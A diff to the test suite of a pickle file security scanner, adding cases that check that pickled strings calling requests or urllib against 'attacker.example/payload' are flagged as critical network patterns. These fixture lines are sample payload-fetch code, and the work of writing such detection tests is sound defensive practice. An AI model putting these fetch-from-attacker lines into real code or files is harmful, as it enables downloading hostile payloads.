@@ -1470,6 +1470,7 @@ def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310(prot
             "socket_docs": "https://docs.example.invalid/reference/socket.connect(host)",
             "credentialed_docs": "https://user:pass@docs.example.invalid/reference/os.system(cmd)",
             "encoded_docs": "https://docs.example.invalid/%E2%98%83/%00/reference/subprocess.run(args)",
+            "apostrophe_docs": "https://docs.example.invalid/a'b/os.system(cmd)",
             "control_docs": "\x00https://docs.example.invalid/reference/httpx.get(url)\x1f",
             "fragmented_docs": ["https://docs.example.invalid/reference/requests.", "get(url)"],
             "repository": "https://github.com/ultralytics/ultralytics",
@@ -1597,6 +1598,30 @@ def test_scan_stream_keeps_executable_network_literal_actionable() -> None:
     )
 
 
+@pytest.mark.parametrize(
+    "literal",
+    [
+        "from requests import get\nget('https://attacker.example/payload')",
+        "from requests import post as send\nsend('https://attacker.example/payload')",
+        "import requests as r\nr.get('https://attacker.example/payload')",
+        "import urllib.request as u\nu.urlopen('https://attacker.example/payload')",
+    ],
+)
+def test_scan_stream_keeps_imported_network_alias_url_actionable(literal: str) -> None:
+    payload = pickle.dumps({"loader": literal}, protocol=0)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="network-alias-code.pkl")
+
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
 def test_scan_stream_keeps_later_network_function_after_inert_url_actionable() -> None:
     payload = pickle.dumps(
         {
@@ -1704,6 +1729,14 @@ def test_scan_stream_keeps_extension_like_url_reduce_actionable() -> None:
         issue.rule_code == "S201"
         and issue.severity == IssueSeverity.CRITICAL
         and issue.details.get("associated_global") == "__copyreg_extension__.code_1"
+        for issue in result.issues
+    )
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
 
